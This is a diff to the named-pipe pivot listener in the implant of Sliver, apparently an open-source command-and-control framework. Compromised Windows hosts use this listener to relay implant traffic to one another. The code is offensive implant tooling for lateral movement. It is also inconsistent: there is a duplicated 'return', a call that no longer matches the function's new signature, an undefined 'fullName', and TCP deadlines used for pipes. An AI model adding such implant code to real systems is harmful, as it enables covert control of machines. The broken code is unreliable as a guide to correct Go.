@@ -30,7 +30,7 @@ import (
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/lesnuages/go-winio"
 	"google.golang.org/protobuf/proto"
 )
@@ -54,13 +54,16 @@ func StartNamedPipePivotListener(pipeName string) (*PivotListener, error) {
 		return err
 	}
 	go namedPipeAcceptConnections(ln)
-	return 	return &PivotListener{
-		Type:     "named-pipe",
-		Listener: ln,
+	return &PivotListener{
+		ID:          ListenerID(),
+		Type:        pb.PivotType_NamedPipe,
+		Listener:    ln,
+		Pivots:      &sync.Map{},
+		BindAddress: fullName,
 	}, nil
 }
 
-func namedPipeAcceptConnections(ln net.Listener) {
+func namedPipeAcceptConnections(pivotListener *PivotListener) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -68,19 +71,27 @@ func namedPipeAcceptConnections(ln net.Listener) {
 		// {{end}}
 		hostname = "."
 	}
-	namedPipe := strings.ReplaceAll(ln.Addr().String(), ".", hostname)
+	namedPipe := strings.ReplaceAll(pivotListener.Listener.Addr().String(), ".", hostname)
 	for {
-		conn, err := ln.Accept()
+		conn, err := pivotListener.Listener.Accept()
 		if err != nil {
 			continue
 		}
-		pivot := &NetConnPivot{
+		// handle connection like any other net.Conn
+		pivotConn := &NetConnPivot{
+			id:            PivotID(),
 			conn:          conn,
 			readMutex:     &sync.Mutex{},
 			writeMutex:    &sync.Mutex{},
-			readDeadline:  namedPipePivotReadDeadline,
-			writeDeadline: namedPipePivotWriteDeadline,
+			readDeadline:  tcpPivotReadDeadline,
+			writeDeadline: tcpPivotWriteDeadline,
 		}
-		go pivot.Start()
+		go func() {
+			// Do not add to pivot listener until key exchange is successful
+			err = pivotConn.Start()
+			if err == nil {
+				pivotListener.Pivots.Store(pivotConn.ID(), pivotConn)
+			}
+		}()
 	}
 }
